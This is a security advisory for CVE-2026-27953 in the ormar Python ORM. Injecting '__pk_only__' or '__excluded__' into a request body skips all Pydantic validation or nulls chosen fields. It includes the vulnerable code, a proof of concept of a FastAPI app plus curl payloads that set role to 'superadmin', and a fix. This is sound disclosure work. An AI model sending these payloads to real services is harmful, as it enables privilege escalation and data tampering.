# [H] ormar Pydantic Validation Bypass via __pk_only__ and __excluded__ Kwargs Injection in Model Constructor

## Summary
Severity: High
Advisory: GHSA-f964-whrq-44h8
CVE: CVE-2026-27953
CWE: CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-f964-whrq-44h8
Type: github-advisory

## Affected
- PyPI: `ormar` — affected >=0 <0.23.1

## Details
### Summary

A Pydantic validation bypass in `ormar`'s model constructor allows any unauthenticated user to skip **all** field validation — type checks, constraints, `@field_validator`/`@model_validator` decorators, choices enforcement, and required-field checks — by injecting `"__pk_only__": true` into a JSON request body. The unvalidated data is subsequently persisted to the database. This affects the **canonical usage pattern** recommended in ormar's official documentation and examples.

A secondary `__excluded__` parameter injection uses the same design pattern to selectively nullify arbitrary model fields during construction.

### Details

**Root cause:** `NewBaseModel.__init__` ([`ormar/models/newbasemodel.py`, line 128](https://github.com/collerek/ormar/blob/master/ormar/models/newbasemodel.py#L128)) pops `__pk_only__` directly from user-supplied `**kwargs` before any validation occurs:

```python
# ormar/models/newbasemodel.py, lines 128-142
pk_only = kwargs.pop("__pk_only__", False)      # ← extracted from user kwargs
object.__setattr__(self, "__pk_only__", pk_only)

new_kwargs, through_tmp_dict = self._process_kwargs(kwargs)

if not pk_only:
    # Normal path: full Pydantic validation
    new_kwargs = self.serialize_nested_models_json_fields(new_kwargs)
    self.__pydantic_validator__.validate_python(
        new_kwargs, self_instance=self
    )
else:
    # Bypass path: NO validation at all
    fields_set = {self.ormar_config.pkname}
    values = new_kwargs
    object.__setattr__(self, "__dict__", values)       # raw dict written directly
    object.__setattr__(self, "__pydantic_fields_set__", fields_set)
```

The `__pk_only__` flag was designed as an internal optimization for creating lightweight FK placeholder instances in [`ormar/fields/foreign_key.py` (lines 41, 527)](https://github.com/collerek/ormar/blob/master/ormar/fields/foreign_key.py#L41). However, because it is extracted from `**kwargs` via `.pop()` with a `False` default, any external caller that passes user-controlled data to the model constructor can inject this flag.

**Why the canonical FastAPI + ormar pattern is vulnerable:**

Ormar's official example ([`examples/fastapi_quick_start.py`, lines 55-58](https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py#L55)) recommends using ormar models directly as FastAPI request body parameters:

```python
@app.post("/items/", response_model=Item)
async def create_item(item: Item):
    await item.save()
    return item
```

FastAPI parses the JSON body and calls `TypeAdapter.validate_python(body_dict)`, which triggers ormar's `__init__`. The `__pk_only__` key is popped at line 128 **before** Pydantic's validator inspects the data, so Pydantic never sees it — even `extra='forbid'` would not prevent this, because the key is already consumed by ormar.

The ormar Pydantic `model_config` (set in [`ormar/models/helpers/pydantic.py`, line 108](https://github.com/collerek/ormar/blob/master/ormar/models/helpers/pydantic.py#L108)) does not set `extra='forbid'`, providing no protection even in theory.

**What is bypassed when `__pk_only__=True`:**
- All type coercion and type checking (e.g., string for int field)
- `max_length` constraints on String fields
- `choices` constraints
- All `@field_validator` and `@model_validator` decorators
- `nullable=False` enforcement at the Pydantic level
- Required-field enforcement (only `pkname` is put in `fields_set`)
- `serialize_nested_models_json_fields()` preprocessing

**Save path persists unvalidated data to the database:**

After construction with `pk_only=True`, calling `.save()` ([`ormar/models/model.py`, lines 89-107](https://github.com/collerek/ormar/blob/master/ormar/models/model.py#L89)) reads fields directly from `self.__dict__` via `_extract_model_db_fields()`, then executes `table.insert().values(**self_fields)` — persisting the unvalidated data to the database with no re-validation.

**Secondary vulnerability — `__excluded__` injection:**

The same pattern applies to `__excluded__` at [`ormar/models/newbasemodel.py`, line 292](https://github.com/collerek/ormar/blob/master/ormar/models/newbasemodel.py#L292):

```python
excluded: set[str] = kwargs.pop("__excluded__", set())
```

At lines 326-329, fields listed in `__excluded__` are silently set to `None`:

```python
for field_to_nullify in excluded:
    new_kwargs[field_to_nullify] = None
```

An attacker can inject `"__excluded__": ["email", "password_hash"]` to nullify arbitrary fields during construction.

**Affected entry points:**

| Entry Point | Exploitable? |
|---|---|
| `async def create_item(item: Item)` (FastAPI route) | Yes |
| `Model.objects.create(**user_dict)` | Yes |
| `Model(**user_dict)` | Yes |
| `Model.model_validate(user_dict)` | Yes |

### PoC

**Step 1: Create a FastAPI + ormar application using the canonical pattern from ormar's docs:**

```python
# app.py
from contextlib import asynccontextmanager
import sqlalchemy
import uvicorn
from fastapi import FastAPI
import ormar

DATABASE_URL = "sqlite+aiosqlite:///test.db"
ormar_base_config = ormar.OrmarConfig(
    database=ormar.DatabaseConnection(DATABASE_URL),
    metadata=sqlalchemy.MetaData(),
)

@asynccontextmanager
async def lifespan(app: FastAPI):
    database_ = app.state.database
    if not database_.is_connected:
        await database_.connect()
    # Create tables
    engine = sqlalchemy.create_engine(DATABASE_URL.replace("+aiosqlite", ""))
    ormar_base_config.metadata.create_all(engine)
    engine.dispose()
    yield
    database_ = app.state.database
    if database_.is_connected:
        await database_.disconnect()

app = FastAPI(lifespan=lifespan)
database = ormar.DatabaseConnection(DATABASE_URL)
app.state.database = database

class User(ormar.Model):
    ormar_config = ormar_base_config.copy(tablename="users")

    id: int = ormar.Integer(primary_key=True)
    name: str = ormar.String(max_length=50)
    email: str = ormar.String(max_length=100)
    role: str = ormar.String(max_length=20, default="user")
    balance: int = ormar.Integer(default=0)

# Canonical ormar pattern from official examples
@app.post("/users/", response_model=User)
async def create_user(user: User):
    await user.save()
    return user

if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)
```

**Step 2: Send a normal request (validation works correctly):**

```bash
# This correctly rejects — "name" exceeds max_length=50
curl -X POST http://127.0.0.1:8000/users/ \
  -H "Content-Type: application/json" \
  -d '{
    "name": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "email": "user@example.com"
  }'
# Returns: 422 Validation Error
```

**Step 3: Inject `__pk_only__` to bypass ALL validation:**

```bash
curl -X POST http://127.0.0.1:8000/users/ \
  -H "Content-Type: application/json" \
  -d '{
    "__pk_only__": true,
    "name": "",
    "email": "not-an-email",
    "role": "superadmin",
    "balance": -99999
  }'
# Returns: 200 OK — all fields persisted to database WITHOUT validation
# - "name" is empty despite being required
# - "email" is not a valid email
# - "role" is "superadmin" (bypassing any validator that restricts to "user"/"admin")
# - "balance" is negative (bypassing any ge=0 constraint)
```

**Step 4: Inject `__excluded__` to nullify arbitrary fields:**

```bash
curl -X POST http://127.0.0.1:8000/users/ \
  -H "Content-Type: application/json" \
  -d '{
    "__excluded__": ["email", "role"],
    "name": "attacker",
    "email": "will-be-nullified@example.com",
    "role": "will-be-nullified"
  }'
# Returns: 200 OK — email and role are set to NULL regardless of input
```

### Impact

**Who is impacted:** Every application using ormar's canonical FastAPI integration pattern (`async def endpoint(item: OrmarModel)`) is vulnerable. This is the primary usage pattern documented in ormar's official examples and documentation.

**Vulnerability type:** Complete Pydantic validation bypass.

**Impact scenarios:**
- **Privilege escalation**: If a model has a `role` or `is_admin` field with a Pydantic validator restricting values to `"user"`, an attacker can set `role="superadmin"` by bypassing the validator
- **Data integrity violation**: Type constraints (`max_length`, `ge`/`le`, regex patterns) are all bypassed — invalid data is persisted to the database
- **Business logic bypass**: Custom `@field_validator` and `@model_validator` decorators (e.g., enforcing email format, age ranges, cross-field dependencies) are entirely skipped
- **Field nullification** (via `__excluded__`): Audit fields, tracking fields, or required business fields can be selectively set to NULL

**Suggested fix:**

Replace `kwargs.pop("__pk_only__", False)` with a keyword-only parameter that cannot be injected via `**kwargs`:

```python
# Before (vulnerable)
def __init__(self, *args: Any, **kwargs: Any) -> None:
    ...
    pk_only = kwargs.pop("__pk_only__", False)

# After (secure)
def __init__(self, *args: Any, _pk_only: bool = False, **kwargs: Any) -> None:
    ...
    object.__setattr__(self, "__pk_only__", _pk_only)
```

Apply the same fix to `__excluded__`:

```python
# Before (vulnerable)
excluded: set[str] = kwargs.pop("__excluded__", set())

# After (secure) — pass via keyword-only _excluded parameter
def __init__(self, *args: Any, _pk_only: bool = False, _excluded: set | None = None, **kwargs: Any) -> None:
    ...
    # In _process_kwargs:
    excludes = _excluded or set()
```

Internal callers in `foreign_key.py` would pass `_pk_only=True` as a named argument. Keyword-only parameters prefixed with `_` cannot be injected via JSON body deserialization or `Model(**user_dict)` unpacking.

## References
- https://github.com/ormar-orm/ormar/security/advisories/GHSA-f964-whrq-44h8
- https://nvd.nist.gov/vuln/detail/CVE-2026-27953
- https://github.com/ormar-orm/ormar/commit/7f22aa21a7614b993970345b392dabb0ccde0ab3
- https://github.com/ormar-orm/ormar
- https://github.com/ormar-orm/ormar/blob/master/examples/fastapi_quick_start.py#L55
- https://github.com/ormar-orm/ormar/blob/master/ormar/fields/foreign_key.py#L41
- https://github.com/ormar-orm/ormar/blob/master/ormar/models/helpers/pydantic.py#L108
- https://github.com/ormar-orm/ormar/blob/master/ormar/models/model.py#L89
- https://github.com/ormar-orm/ormar/blob/master/ormar/models/newbasemodel.py#L128
- https://github.com/ormar-orm/ormar/blob/master/ormar/models/newbasemodel.py#L292
- https://github.com/ormar-orm/ormar/releases/tag/0.23.1
